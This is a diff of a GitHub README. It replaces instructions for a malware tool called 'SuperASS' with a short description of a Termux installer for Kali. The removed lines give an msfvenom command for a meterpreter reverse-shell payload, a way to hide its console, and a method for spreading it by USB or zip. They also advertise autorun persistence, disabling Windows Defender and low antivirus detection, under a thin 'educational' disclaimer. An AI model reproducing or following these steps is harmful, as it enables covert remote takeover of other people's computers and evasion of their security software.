@@ -25,30 +25,20 @@
 git clone https://github.com/AbdulazizDXT/KaliOnTermux ;cd KaliOnTermux ;chmod +x installer.sh ;./installer.sh
 
 ```
-## [+] Usage
+## [+] How to Work?
 
-1. Run the script
-2. SuperASS file window will open automatically after installation
-3. Open Terminal and Type "msfvenom -p python/meterpreter/reverse_tcp LHOST={YourIPAddres} LPORT={Your Port} -o Update.py
-4. ReName file --> "Update.py" to "Update.pyw" For hide python console
-5. Copy the Update.pyw file to the Open SuperASS window and click Replace
-6. Now the file must be transferred to the Windows system to start creating an exe file for the virus in the USB or zip files
- 
+ - The installer fixes a common problem with Termux and then downloads and installs automatically
+
 ## [√] Features:
 
- - Under 10s to install payload in target device
- - connect Metasploit to hacking
- - Python Quiet install
- - autorun payload in startup windows
- - kill windows defender forever
- - {5 security vendors and no sandboxes flagged this file as malicious} in ViursTotal <57/5>
- - This is the antivirus that detected the virus {Antiy-AVL, GData, Microsoft, ClamAV ,Ikarus}
- - Soon a copy will be released that disables all antivirus programs!
+ - Easy to use
+ - Script 100% Shell Bash Script
+ - super fix
 
-## [+] Something very important!
+## [+] Something For You :
 
-- This tool is developed for educational purposes. Here he explains how hacking works. If anyone wants to gain unauthorized access to someone's devices, they can try it at their own risk. You have your own responsibilities and you are responsible for any damage or violation of laws by this tool. The author is not responsible for any misuse of SuperASS!
- 
+- If you need help or a problem, you can contact me via e-mail or my Instagram account ```@syziks``` I am honored to all
+
 ## [+] I'm Here!
 
 
